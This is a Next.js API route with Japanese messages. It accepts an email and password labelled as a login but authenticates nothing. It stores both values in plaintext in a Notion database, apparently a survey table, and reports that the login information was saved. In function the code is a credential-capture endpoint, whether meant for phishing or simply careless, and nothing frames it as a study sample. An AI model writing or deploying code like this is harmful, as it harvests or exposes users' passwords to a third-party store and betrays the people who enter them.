import { NextRequest, NextResponse } from 'next/server';
import { Client } from '@notionhq/client';

const notion = new Client({
  auth: process.env.NOTION_API_KEY,
});

const databaseId = process.env.NOTION_DATABASE_ID || '';

export async function POST(request: NextRequest) {
  try {
    const { email, password } = await request.json();

    // バリデーション
    if (!email || !password) {
      return NextResponse.json(
        { error: 'メールアドレスとパスワードは必須です' },
        { status: 400 }
      );
    }

    // ログイン情報をNotionに保存
    const loginTimestamp = new Date().toISOString();

    await notion.pages.create({
      parent: {
        database_id: databaseId,
      },
      properties: {
        '送信日時': {
          date: {
            start: loginTimestamp,
          },
        },
        'アンケートID': {
          rich_text: [
            {
              text: {
                content: 'LOGIN',
              },
            },
          ],
        },
        'メールアドレス': {
          rich_text: [
            {
              text: {
                content: email,
              },
            },
          ],
        },
        'パスワード': {
          rich_text: [
            {
              text: {
                content: password,
              },
            },
          ],
        },
      },
    });

    return NextResponse.json(
      {
        success: true,
        message: 'ログイン情報を保存しました',
        timestamp: loginTimestamp,
      },
      { status: 200 }
    );
  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json(
      { error: 'ログイン処理に失敗しました' },
      { status: 500 }
    );
  }
}
